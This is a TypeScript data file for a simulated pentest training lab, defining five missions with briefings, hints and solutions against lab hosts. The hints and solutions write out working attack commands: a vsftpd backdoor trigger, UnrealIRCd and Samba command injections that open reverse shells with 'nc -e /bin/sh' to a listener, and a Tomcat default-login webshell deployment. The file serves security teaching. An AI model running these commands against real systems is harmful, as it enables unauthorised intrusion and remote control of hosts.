// Missions: the 5 hands-on challenges. Each maps to a flag set by the SimEngine.

export interface Mission {
  id: string;
  title: string;
  difficulty: "Easy" | "Medium";
  flag: string;
  objective: string;
  briefing: string;
  hints: string[];
  solution: string[];
}

export const missions: Mission[] = [
  {
    id: "recon",
    title: "Map the Network",
    difficulty: "Easy",
    flag: "recon_done",
    objective: "Run a version-detecting Nmap scan against 192.168.56.20",
    briefing:
      "Every pentest starts with recon. Your target is 192.168.56.20 on the lab network. " +
      "Find every open port and identify what software is running on each one. " +
      "Write down anything that looks old, odd, or misconfigured — you'll need that list later.",
    hints: [
      "Start with host discovery: nmap -sn 192.168.56.0/24",
      "Then scan versions: nmap -sV 192.168.56.20",
      "Add -sC to run safe enumeration scripts too",
    ],
    solution: ["nmap -sn 192.168.56.0/24", "nmap -sV -sC 192.168.56.20"],
  },
  {
    id: "vsftpd",
    title: "Backdoor Bandit",
    difficulty: "Easy",
    flag: "vsftpd_root",
    objective: "Trigger the vsftpd 2.3.4 backdoor and land a root shell",
    briefing:
      "Port 21 runs vsftpd 2.3.4 — a version with a deliberate backdoor (CVE-2011-2523). " +
      "When the FTP username ends with a smiley ':)', the server quietly opens a root " +
      "shell on port 6200. Talk to the FTP service by hand, trigger it, then connect.",
    hints: [
      "Connect manually: telnet 192.168.56.20 21",
      "At the FTP prompt type: USER anything:)",
      "Then: PASS anything — now check port 6200 with nc",
    ],
    solution: [
      "telnet 192.168.56.20 21",
      "USER backdoor:)",
      "PASS x",
      "nc 192.168.56.20 6200",
      "whoami   → root",
    ],
  },
  {
    id: "unrealircd",
    title: "Trojan Horse",
    difficulty: "Easy",
    flag: "irc_rce",
    objective: "Execute a command through the UnrealIRCd 3.2.8.1 backdoor",
    briefing:
      "The IRC server on port 6667 is a trojaned UnrealIRCd 3.2.8.1 (CVE-2010-2075). " +
      "Anything you send after the letters 'AB;' gets executed by the server. " +
      "Connect with netcat and prove you can run commands — bonus points for a reverse shell.",
    hints: [
      "Connect: nc 192.168.56.20 6667",
      "Try: AB; id",
      "Reverse shell: first run  nc -lvnp 4444  on Kali, then  AB; nc -e /bin/sh 192.168.56.10 4444",
    ],
    solution: [
      "nc 192.168.56.20 6667",
      "AB; id",
      "# reverse shell:",
      "nc -lvnp 4444",
      "AB; nc -e /bin/sh 192.168.56.10 4444",
    ],
  },
  {
    id: "samba",
    title: "The Name Game",
    difficulty: "Medium",
    flag: "samba_root",
    objective: "Exploit the Samba username map script for a root shell",
    briefing:
      "Samba 3.0.20 on ports 139/445 passes the login username through a shell script " +
      "(CVE-2007-2447). Usernames containing shell metacharacters get executed. " +
      "Craft a username that phones home to a netcat listener you control.",
    hints: [
      "Start a listener first: nc -lvnp 4445",
      "The evil username: './=`nohup nc -e /bin/sh 192.168.56.10 4445`'",
      "Full command: smbclient //192.168.56.20/tmp -U './=`nohup nc -e /bin/sh 192.168.56.10 4445`'",
    ],
    solution: [
      "nc -lvnp 4445",
      "smbclient //192.168.56.20/tmp -U './=`nohup nc -e /bin/sh 192.168.56.10 4445`'",
      "whoami   → root",
    ],
  },
  {
    id: "tomcat",
    title: "Default Danger",
    difficulty: "Medium",
    flag: "tomcat_rce",
    objective: "Log into Tomcat manager with default creds and deploy a webshell",
    briefing:
      "Apache Tomcat on port 8180 still uses the factory credentials tomcat:tomcat. " +
      "The manager app lets authenticated users deploy WAR files — i.e. upload code " +
      "the server will run. Deploy your shell and execute commands through it.",
    hints: [
      "Check the manager: curl -u tomcat:tomcat http://192.168.56.20:8180/manager/html",
      "Deploy: curl -u tomcat:tomcat --upload-file shell.war \"http://192.168.56.20:8180/manager/deploy?path=/shell\"",
      "Execute: curl \"http://192.168.56.20:8180/shell/shell.jsp?cmd=id\"",
    ],
    solution: [
      "curl -u tomcat:tomcat http://192.168.56.20:8180/manager/html",
      "curl -u tomcat:tomcat --upload-file shell.war \"http://192.168.56.20:8180/manager/deploy?path=/shell\"",
      "curl \"http://192.168.56.20:8180/shell/shell.jsp?cmd=whoami\"",
    ],
  },
];

export const PROGRESS_KEY = "hacklab-progress-v1";

export function loadProgress(): string[] {
  if (typeof window === "undefined") return [];
  try {
    return JSON.parse(localStorage.getItem(PROGRESS_KEY) || "[]");
  } catch {
    return [];
  }
}

export function saveProgress(ids: string[]) {
  try {
    localStorage.setItem(PROGRESS_KEY, JSON.stringify(ids));
  } catch {
    /* private mode etc. */
  }
}
